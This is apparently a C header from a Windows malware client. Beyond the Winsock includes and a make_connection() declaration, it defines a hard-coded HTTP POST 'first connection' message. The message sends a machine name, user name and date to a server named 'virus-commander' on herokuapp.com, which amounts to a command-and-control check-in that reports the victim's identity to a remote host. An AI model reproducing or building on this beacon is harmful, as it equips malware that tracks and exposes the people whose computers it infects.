#ifndef UNICODE
#define UNICODE
#endif

#define WIN32_LEAN_AND_MEAN

#define _WINSOCK_DEPRECATED_NO_WARNINGS

#define _CRT_SECURE_NO_WARNINGS

#pragma once
#include <winsock2.h>
#include <ws2def.h>
#include <stdio.h>
#include <windows.h>
#include <stdlib.h>
#include <string.h>

#include <ws2tcpip.h>


// Need to link with Ws2_32.lib
#pragma comment(lib, "ws2_32.lib")


#define FIRST_CONNECTION_POST_MSG "POST /first_connection HTTP/1.1\r\nHost: my-server-virus-commander.herokuapp.com\r\nConnection: keep-alive\r\nContent-Type: application/json\r\nAccept: application/json,text/html\r\nContent-Length: 65\r\n\r\n{\"pc_name\":\"DESKTOP-TOSGN1S\",\"user_name\":\"a\",\"day_of_month\":\"21\"}"


int make_connection();
